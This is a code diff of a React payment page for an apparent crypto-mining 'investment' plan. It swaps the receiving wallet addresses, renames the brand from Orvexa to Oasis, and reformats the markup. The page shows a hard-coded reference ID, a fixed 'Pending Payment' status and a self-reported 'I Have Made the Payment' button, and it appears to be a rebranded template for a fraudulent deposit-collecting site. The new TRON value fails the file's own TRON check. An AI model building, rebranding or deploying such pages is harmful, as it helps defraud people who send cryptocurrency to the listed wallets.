@@ -19,12 +19,14 @@ type WalletConfig = {
 // Replace these two placeholders with YOUR receiving wallet addresses.
 // Ethereum addresses normally start with 0x and contain 40 hexadecimal characters.
 // TRON addresses normally start with T and contain 34 Base58 characters.
-const ETHEREUM_ADDRESS = "0x9709bA908d4771033dACCe73737F8802B1122F33";
-const TRON_ADDRESS = "TArf53863Ggqqj6vhRu8gxmdm5t2WxW5FY";
-const BITCOIN_ADDRESS = "bc1qwsrgyjw9hyu25qtdhuqxm9r8yygpmmywl8nv9n";
+const ETHEREUM_ADDRESS = "0x84356C935959f2F936c82084242bd37F25E75cDB";
+const TRON_ADDRESS = "UQDm4k6g0GJ_CpK6i7KUWB6-740Z4cM2Mzk6wUaKUjuh2b7o";
+const BITCOIN_ADDRESS = "bc1qv66dmzenn3dwh46h2tgnmaj54q7xr2frre6la2";
 
-const isEthereumAddress = (address: string) => /^0x[a-fA-F0-9]{40}$/.test(address);
-const isTronAddress = (address: string) => /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address);
+const isEthereumAddress = (address: string) =>
+  /^0x[a-fA-F0-9]{40}$/.test(address);
+const isTronAddress = (address: string) =>
+  /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address);
 
 const PaymentOptions: React.FC = () => {
   const [method, setMethod] = useState<PaymentMethod | "">("");
@@ -49,14 +51,14 @@ const PaymentOptions: React.FC = () => {
       network: "Ethereum Mainnet",
       address: ETHEREUM_ADDRESS,
       configured: isEthereumAddress(ETHEREUM_ADDRESS),
-      qrSrc: eth
+      qrSrc: eth,
     },
     tron: {
       label: "TRON (TRX)",
       network: "TRON network",
       address: TRON_ADDRESS,
       configured: isTronAddress(TRON_ADDRESS),
-      qrSrc: tron
+      qrSrc: tron,
     },
   };
 
@@ -161,39 +163,53 @@ const PaymentOptions: React.FC = () => {
           🚀 Secure Your Crypto Mining Investment
         </h2>
         <p className="text-gray-700 mb-4">
-          You’re one step away from activating your mining plan with <strong>Orvexa</strong>.
+          You’re one step away from activating your mining plan with{" "}
+          <strong>Oasis</strong>.
         </p>
         <p className="text-gray-700 mb-4">
           To proceed, please select one of the approved payment methods below.
         </p>
 
         <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-4">
-          <p className="font-semibold text-yellow-800 mb-1">Investment Confirmation</p>
+          <p className="font-semibold text-yellow-800 mb-1">
+            Investment Confirmation
+          </p>
           <p className="mt-2">
-            Payment submissions remain pending until they have been independently reviewed.
+            Payment submissions remain pending until they have been
+            independently reviewed.
           </p>
         </div>
 
         <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
-          <p className="font-semibold text-gray-800 mb-1">💼 Investment Summary</p>
+          <p className="font-semibold text-gray-800 mb-1">
+            💼 Investment Summary
+          </p>
           <ul className="list-disc list-inside text-gray-700 space-y-1">
             <li>
-              Plan Status: <span className="text-red-600 font-semibold">Pending Payment</span>
+              Plan Status:{" "}
+              <span className="text-red-600 font-semibold">
+                Pending Payment
+              </span>
             </li>
             <li>
               Plan Type: <strong>Crypto Mining</strong>
             </li>
             <li>
-              Network Allocation: <span className="text-blue-700 font-semibold">24h Hashrate Lease</span>
+              Network Allocation:{" "}
+              <span className="text-blue-700 font-semibold">
+                24h Hashrate Lease
+              </span>
             </li>
             <li>
-              Reference ID: <code className="bg-gray-100 px-1 rounded">BFC-MIN-009832</code>
+              Reference ID:{" "}
+              <code className="bg-gray-100 px-1 rounded">BFC-MIN-009832</code>
             </li>
           </ul>
         </div>
 
         <p className="text-xs text-gray-500 mb-2">
-          ⛏️ Verify the receiving wallet and network carefully before sending cryptocurrency.
+          ⛏️ Verify the receiving wallet and network carefully before sending
+          cryptocurrency.
         </p>
       </div>
 
@@ -203,7 +219,10 @@ const PaymentOptions: React.FC = () => {
             Choose Payment Method
           </h1>
 
-          <label htmlFor="paymentMethod" className="block text-sm font-medium text-gray-700 mb-2">
+          <label
+            htmlFor="paymentMethod"
+            className="block text-sm font-medium text-gray-700 mb-2"
+          >
             Payment method
           </label>
           <select
@@ -226,23 +245,29 @@ const PaymentOptions: React.FC = () => {
           {activeWallet && (
             <div className="bg-yellow-50 p-4 rounded-md flex flex-col gap-4 border border-yellow-300 text-sm">
               <div>
-                <p className="font-semibold text-gray-800">{activeWallet.label}</p>
-                <p className="text-xs text-gray-600 mt-1">Network: {activeWallet.network}</p>
+                <p className="font-semibold text-gray-800">
+                  {activeWallet.label}
+                </p>
+                <p className="text-xs text-gray-600 mt-1">
+                  Network: {activeWallet.network}
+                </p>
               </div>
 
               {!activeWallet.configured ? (
                 <div className="rounded-lg border border-amber-300 bg-amber-100 p-3 text-amber-900">
                   <p className="font-semibold">Wallet address not configured</p>
                   <p className="mt-1">
-                    Add your real {activeWallet.label} receiving address to the
-                    {" "} <code>ETHEREUM_ADDRESS</code> or <code>TRON_ADDRESS</code> constant at the top of this file.
-                    The QR code will be generated from that address automatically.
+                    Add your real {activeWallet.label} receiving address to the{" "}
+                    <code>ETHEREUM_ADDRESS</code> or <code>TRON_ADDRESS</code>{" "}
+                    constant at the top of this file. The QR code will be
+                    generated from that address automatically.
                   </p>
                 </div>
               ) : (
                 <>
                   <p className="font-medium text-gray-800">
-                    Send only using the {activeWallet.network} to the wallet address below:
+                    Send only using the {activeWallet.network} to the wallet
+                    address below:
                   </p>
 
                   {activeWallet.qrSrc && (
@@ -277,11 +302,16 @@ const PaymentOptions: React.FC = () => {
 
               {!paymentSubmitted ? (
                 <div className="border-t border-yellow-200 pt-4 mt-2">
-                  <label htmlFor="amountSent" className="block text-sm font-semibold text-gray-800 mb-2">
+                  <label
+                    htmlFor="amountSent"
+                    className="block text-sm font-semibold text-gray-800 mb-2"
+                  >
                     Amount Sent (USD)
                   </label>
                   <div className="relative">
-                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">$</span>
+                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500">
+                      $
+                    </span>
                     <input
                       id="amountSent"
                       type="text"
@@ -293,7 +323,8 @@ const PaymentOptions: React.FC = () => {
                     />
                   </div>
                   <p className="text-xs text-gray-500 mt-2">
-                    Submitting this form records the payment as pending; it does not confirm receipt on the blockchain.
+                    Submitting this form records the payment as pending; it does
+                    not confirm receipt on the blockchain.
                   </p>
                   <button
                     type="button"
@@ -301,7 +332,9 @@ const PaymentOptions: React.FC = () => {
                     disabled={submitting || !activeWallet.configured}
                     className="w-full mt-4 bg-blue-800 text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                   >
-                    {submitting ? "Submitting Payment..." : "I Have Made the Payment"}
+                    {submitting
+                      ? "Submitting Payment..."
+                      : "I Have Made the Payment"}
                   </button>
                 </div>
               ) : (
@@ -311,10 +344,14 @@ const PaymentOptions: React.FC = () => {
                       <span className="text-xl text-green-600">✓</span>
                     </div>
                     <div>
-                      <p className="text-green-700 font-semibold">Payment Submitted — Pending</p>
+                      <p className="text-green-700 font-semibold">
+                        Payment Submitted — Pending
+                      </p>
                       <p className="text-xs text-gray-600 mt-1">
                         Your reported payment of{" "}
-                        <strong>{formatAmountForHistory(submittedAmount ?? 0)}</strong>{" "}
+                        <strong>
+                          {formatAmountForHistory(submittedAmount ?? 0)}
+                        </strong>{" "}
                         has been recorded as pending verification.
                       </p>
                     </div>
